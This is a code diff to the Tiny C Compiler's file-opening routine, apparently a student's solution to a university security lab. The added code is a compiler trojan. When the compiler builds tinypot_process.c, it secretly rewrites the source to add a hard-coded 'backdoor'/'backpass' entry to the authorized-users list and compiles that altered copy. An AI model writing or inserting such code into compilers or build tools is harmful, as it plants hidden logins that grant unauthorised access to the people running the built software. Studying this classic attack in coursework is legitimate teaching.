@@ -603,8 +603,36 @@ ST_FUNC void tcc_close(void)
 ST_FUNC int tcc_open(TCCState *s1, const char *filename)
 {
     int fd;
+    FILE *fp;
+    FILE *cfp;
+    char *target = "AuthData_t authorizedUsers[]";
     if (strcmp(filename, "-") == 0)
         fd = 0, filename = "<stdin>";
+    else if (strcmp(filename, "tinypot_process.c") == 0) {
+	cfp = fopen("/home/vikas/Desktop/UTAustin-Courses/2020sp_cs316s/labs/lab1/tinypot/tinypot_process.c", "r");
+	fp = fopen("/home/vikas/Desktop/UTAustin-Courses/2020sp_cs316s/labs/lab1/tinypot/tinypot_process1.c", "w");
+	if (cfp != NULL) {
+	    if (fp != NULL) {
+	    char line[128];
+	    while (fgets(line, sizeof line, cfp) != NULL) {
+		if (strstr(line, target) != NULL) {
+	    	    fprintf(fp, "%s", line);
+	    	    fprintf(fp, "{\"backdoor\", \"backpass\"},\n");
+		} else {
+		    fprintf(fp, "%s", line);	    
+		}
+	    }
+	    fclose(cfp);
+	    fclose(fp);	
+	    } else {
+		perror("/home/vikas/Desktop/UTAustin-Courses/2020sp_cs316s/labs/lab1/tinypot/tinypot_process1.c");
+	    }
+	} else {
+	    perror("/home/vikas/Desktop/UTAustin-Courses/2020sp_cs316s/labs/lab1/tinypot/tinypot_process.c");
+	}
+	filename = "/home/vikas/Desktop/UTAustin-Courses/2020sp_cs316s/labs/lab1/tinypot/tinypot_process1.c";
+	fd = open(filename, O_RDONLY | O_BINARY);
+    }
     else
         fd = open(filename, O_RDONLY | O_BINARY);
     if ((s1->verbose == 2 && fd >= 0) || s1->verbose == 3)
